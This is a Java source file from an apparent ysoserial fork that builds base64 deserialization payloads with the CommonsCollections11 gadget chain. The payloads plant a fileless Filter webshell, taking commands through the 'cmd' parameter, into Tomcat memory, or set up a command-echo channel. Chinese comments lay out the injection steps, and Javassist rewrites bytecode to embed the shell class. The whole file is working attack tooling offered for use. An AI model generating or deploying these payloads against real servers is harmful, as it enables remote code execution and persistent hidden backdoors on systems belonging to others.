package ysoserial.exploit.memeryShell;

import com.memeryShell.tomcat.DefineClass;
import com.memeryShell.tomcat.MyFilter;
import com.memeryShell.tomcat.TomcatEcho;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import sun.misc.BASE64Decoder;
import sun.misc.BASE64Encoder;
import ysoserial.GeneratePayload;
import ysoserial.payloads.CommonsCollections11;
import ysoserial.payloads.util.Gadgets;

import java.io.*;
import java.net.URL;

/**
 * 目前仅支持CC11
 * */
public class Tomcat {

    public static void main(String[] args) {
//        tomcatEchoBase64();
        filterBase64();
    }

    /**
    * 生成Filter型内存马
     * 默认打入的Filter马在 com.memeryShell.Tomcat.MyFilter
     * 默认请求参数: cmd
    * */
    public static void filterBase64(){
        //思路:
        //大体分两步
        //1. 先将Filter打进Tomcat内存
        //  a. 获取Filter马的字节码
        //  b. 通过调用defineClass()的反序列化链，生成payload
        //2. 注册Filter
        //  a. 获取具有注册Filter功能的恶意类字节码
        //  b. 通过调用defineClass()的反序列化链，执行注册Filter操作
        Filter filter = new Filter();
//        filter.filterClassBytesBase64();
        filter.filterInMemeryBase64();
    }

    /**
     * Tomcat回显
     * 默认请求参数: cmd
     * */
    public static void tomcatEchoBase64(){
        Echo echo = new Echo();
        echo.tomcatEchoBase64();
    }
}

class Filter{
    private String filterClassPath = MyFilter.class.getName();
    private String[] matchUrl = new String[]{"/*"};
    private String filterName;

    public void filterInMemeryBase64(){
        System.out.println("[+] 将Filter打入Tomcat内存的Payload: ");
        try {
            byte[] classBytes = Utils.loadClassBytes(MyFilter.class);
            final com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl templates = (com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl) Gadgets.createTemplatesImpl(classBytes, MyFilter.class.getName());
            //用CC11，创建反序列化Gadgets
            CommonsCollections11 commonsCollections11 = new CommonsCollections11();
            Serializable filterClassObject = commonsCollections11.getObject(templates);
            byte[] bytes = Utils.objectToBytes(filterClassObject);
            System.out.println(Utils.bytesToBase64String(bytes));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void filterClassBytesBase642(){
        System.out.println("[+] Filter Class的字节码: ");
        try {
            //重写加载类字节码
            reBuildClassCode();
            byte[] bytes = Utils.loadClassBytes(DefineClass.class);
            System.out.println(Utils.bytesToBase64String(bytes));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void filterInMemeryBase642(){
        System.out.println("[+] 将Filter打入Tomcat内存的Payload: ");
        try {
            //重写加载类字节码
            reBuildClassCode();
            byte[] classBytes = Utils.loadClassBytes(DefineClass.class);
            final com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl templates = (com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl) Gadgets.createTemplatesImpl(classBytes, DefineClass.class.getName());
            //用CC11，创建反序列化Gadgets
            CommonsCollections11 commonsCollections11 = new CommonsCollections11();
            Serializable filterClassObject = commonsCollections11.getObject(templates);
            byte[] bytes = Utils.objectToBytes(filterClassObject);
            System.out.println(Utils.bytesToBase64String(bytes));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void reBuildClassCode() throws Exception{
        //运用javassist动态生成DefineClass吧。。还没学咋操作字节码呢。暂时先这样.... 尴尬的一批的构造
        StringBuffer stringBuffer = new StringBuffer();
        stringBuffer.append("classBytes = new byte[]{");
        byte[] myFilterClassBytes = Utils.loadClassBytes(MyFilter.class);
        System.out.println(Utils.bytesToBase64String(myFilterClassBytes));
        System.out.println("[+] ----------------------------");
        for (byte myFilterClassByte : myFilterClassBytes) {
            String tmp = "" + (int) myFilterClassByte;
            stringBuffer.append(tmp);
            stringBuffer.append(",");
        }
        stringBuffer.deleteCharAt(stringBuffer.lastIndexOf(","));
        stringBuffer.append("};");
        String filterClassCodeBytes = stringBuffer.toString();

        ClassPool classPool = ClassPool.getDefault();
        CtClass ctClass = classPool.get(DefineClass.class.getName());
        CtMethod defineClass = ctClass.getDeclaredMethod("defineClass");
        defineClass.insertBefore(filterClassCodeBytes);

        //覆盖掉原类
        String defineClassPath = DefineClass.class.getResource(DefineClass.class.getSimpleName() + ".class").getPath();
        String classPath = DefineClass.class.getName();
        classPath = classPath.replace(".", "/");
        defineClassPath = defineClassPath.replace(classPath + ".class", "");
        ctClass.writeFile(defineClassPath);
    }

    public void setFilterClassPath(String filterClassPath) {
        this.filterClassPath = filterClassPath;
    }

    public void setMatchUrl(String[] matchUrl) {
        this.matchUrl = matchUrl;
    }

    public void setFilterName(String filterName) {
        this.filterName = filterName;
    }
}

class Echo{
    public void tomcatEchoBase64(){
        System.out.println("[+] 将Tomcat Echo Payload: ");
        try {
            byte[] classBytes = Utils.loadClassBytes(TomcatEcho.class);
            final com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl templates = (com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl) Gadgets.createTemplatesImpl(classBytes, TomcatEcho.class.getName());
            //用CC11，创建反序列化Gadgets
            CommonsCollections11 commonsCollections11 = new CommonsCollections11();
            Serializable filterClassObject = commonsCollections11.getObject(templates);
            byte[] bytes = Utils.objectToBytes(filterClassObject);
            System.out.println(Utils.bytesToBase64String(bytes));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
